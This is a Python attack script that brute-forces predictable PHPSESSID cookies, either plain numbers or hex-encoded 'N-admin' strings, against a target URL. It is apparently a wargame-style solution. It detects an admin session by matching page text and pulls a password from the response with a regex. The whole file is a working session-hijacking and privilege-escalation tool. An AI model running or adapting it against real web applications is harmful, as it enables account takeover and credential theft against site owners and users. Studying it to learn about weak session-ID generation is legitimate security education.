#!/usr/bin/env python3
import argparse
import requests
import binascii
import time
import re


def generate_session_id(index: int, mode: str) -> str:
    """
    Generate a session identifier based on the selected mode.
    """
    if mode == "numeric":
        return str(index)

    elif mode == "hex-admin":
        return binascii.hexlify(f"{index}-admin".encode()).decode()

    else:
        raise ValueError("Invalid mode. Use 'numeric' or 'hex-admin'.")


def parse_args():
    parser = argparse.ArgumentParser(
        description="Enumerate predictable web session identifiers."
    )

    parser.add_argument(
        "--url",
        required=True,
        help="Target URL"
    )

    parser.add_argument(
        "--user",
        required=True,
        help="HTTP authentication username"
    )

    parser.add_argument(
        "--password",
        required=True,
        help="HTTP authentication password"
    )

    parser.add_argument(
        "--mode",
        choices=["numeric", "hex-admin"],
        required=True,
        help="Session ID generation mode"
    )

    parser.add_argument(
        "--start",
        type=int,
        default=1,
        help="Starting session index (default: 1)"
    )

    parser.add_argument(
        "--end",
        type=int,
        default=640,
        help="Ending session index (default: 640)"
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.05,
        help="Delay between requests (seconds)"
    )

    parser.add_argument(
        "--match",
        default="You are an admin",
        help="Text indicating successful privilege escalation"
    )

    return parser.parse_args()


def main():
    args = parse_args()

    print(f"[*] Target URL  : {args.url}")
    print(f"[*] Mode        : {args.mode}")
    print(f"[*] ID Range    : {args.start} → {args.end}")
    print()

    for i in range(args.start, args.end + 1):
        session_id = generate_session_id(i, args.mode)

        try:
            response = requests.get(
                args.url,
                auth=(args.user, args.password),
                cookies={"PHPSESSID": session_id},
                timeout=6
            )
        except requests.RequestException:
            continue

        if args.match in response.text:
            print("\n[+] VALID SESSION IDENTIFIED")
            print(f"    Index      : {i}")
            print(f"    Session ID : {session_id}")

            # Optional password extraction (if present)
            match = re.search(r"password\s+for\s+\w+\s+is\s*<b>([^<]+)</b>", response.text)
            if match:
                print(f"    Extracted Password: {match.group(1)}")

            return

        if i % 50 == 0:
            print(f"[*] Tested up to {i}")

        time.sleep(args.delay)

    print("[-] No valid session found.")


if __name__ == "__main__":
    main()
